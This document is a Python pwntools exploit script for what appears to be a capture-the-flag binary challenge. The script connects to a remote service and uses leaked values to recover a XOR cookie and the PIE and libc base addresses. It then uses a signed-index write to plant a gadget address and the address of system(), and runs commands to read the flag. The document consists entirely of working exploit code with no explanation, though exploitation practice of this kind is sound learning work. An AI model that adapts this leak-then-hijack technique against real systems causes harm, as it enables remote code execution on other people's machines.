from pwn import *
import ctypes

context.arch = 'amd64'
context.log_level = 'info'

p = remote('134.112.58.12', 31341)

elf = ELF('./chall')
libc = ELF('./libc.so.6')

def menu(choice):
    p.sendlineafter(b'> ', str(choice).encode())

def inscribe(idx, val):
    menu(1)
    p.sendlineafter(b'line (signed index): ', str(idx).encode())
    sval = ctypes.c_long(val).value
    p.sendlineafter(b'value: ', str(sval).encode())

def read_seal():
    menu(2)
    line = p.recvline().decode()
    parts = line.strip().split()
    reflection = int(parts[1].split('=')[1], 16)
    anchor = int(parts[2].split('=')[1], 16)
    cookie_hint = int(parts[3].split('=')[1], 16)
    count = int(parts[4].split('=')[1])
    return reflection, anchor, cookie_hint, count

reflection, anchor, cookie_hint, count = read_seal()
log.info(f"leaks: {hex(reflection)} {hex(anchor)} {hex(cookie_hint)}")
cookie = cookie_hint ^ 0x5ea1ed5ea1ed5ea1
quiet_scribe = reflection ^ cookie
puts_addr = anchor ^ cookie
pie_base = quiet_scribe - 0x1259
libc_base = puts_addr - libc.symbols['puts']
system = libc_base + libc.symbols['system']
ferry_relay = pie_base + 0x1268
seal_val = cookie ^ 0xd15c10edfacade55
log.info(f"bases pie={hex(pie_base)} libc={hex(libc_base)}")
inscribe(12, seal_val)
inscribe(8, ferry_relay)
inscribe(9, system)
menu(3)
p.sendline(b'id')
print(p.recvline(timeout=3))
p.sendline(b'cat flag* || cat /flag* || ls')
print(p.recvall(timeout=3))
